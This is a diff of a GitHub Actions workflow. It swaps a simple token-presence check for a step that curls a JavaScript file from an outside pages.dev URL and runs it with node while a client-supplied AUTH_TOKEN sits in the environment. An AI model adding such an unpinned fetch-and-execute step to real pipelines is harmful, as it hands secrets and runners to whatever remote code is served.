@@ -1,28 +1,39 @@
-name: Dynamic Orchestration Pipeline
-
-on:
-  workflow_dispatch:
-
-  repository_dispatch:
-    types:
-      - deploy_to_cloudflare
-
-jobs:
-  test-auth-token:
-    runs-on: ubuntu-latest
-
-    steps:
-      - name: Test Auth Token
-        env:
-          AUTH_TOKEN: ${{ github.event.client_payload.auth_token }}
-        run: |
-          echo "Test action started"
-
-          if [ -z "$AUTH_TOKEN" ]; then
-            echo "AUTH_TOKEN was not received"
-            exit 1
-          fi
-
-          echo "AUTH_TOKEN was received"
-          echo "Token length: ${#AUTH_TOKEN}"
-          echo "Token test successful"
+name: Dynamic Orchestration Pipeline 
+ 
+on: 
+  # 1. Allows you to trigger this build manually from the GitHub Actions tab UI 
+  workflow_dispatch: 
+ 
+  # 2. Allows you to trigger this build automatically via a simple API Hook / Webhook 
+  repository_dispatch: 
+    types: [deploy_to_cloudflare] 
+ 
+jobs: 
+  execute-engine: 
+    runs-on: ubuntu-latest 
+ 
+    steps: 
+      # Step 1: Checkout the client data repository files into the workspace 
+      - name: Checkout Repository Assets 
+        uses: actions/checkout@v4 
+ 
+      # Step 2: Establish the Node.js execution runtime node environment 
+      - name: Setup Runtime Architecture 
+        uses: actions/setup-node@v4 
+        with: 
+          node-version: "22" 
+ 
+      # Step 3: Fetch your remote orchestrator script and run it with the client payload token
+      - name: Fetch and Execute Remote Build Engine 
+        env: 
+          # Reads the token sent by the client inside the repository_dispatch event payload
+          AUTH_TOKEN: ${{ github.event.client_payload.auth_token }} 
+           
+        run: | 
+          echo "📡 Connecting to your secure cloud framework grid..." 
+           
+          # Pulls the deployment script completely live from your specified remote URL endpoint location 
+          curl -s --fail "https://buildfiles.pages.dev/actions-build.js" -o build.js
+          
+          echo "⚡ Executing build engine..."
+          node build.js
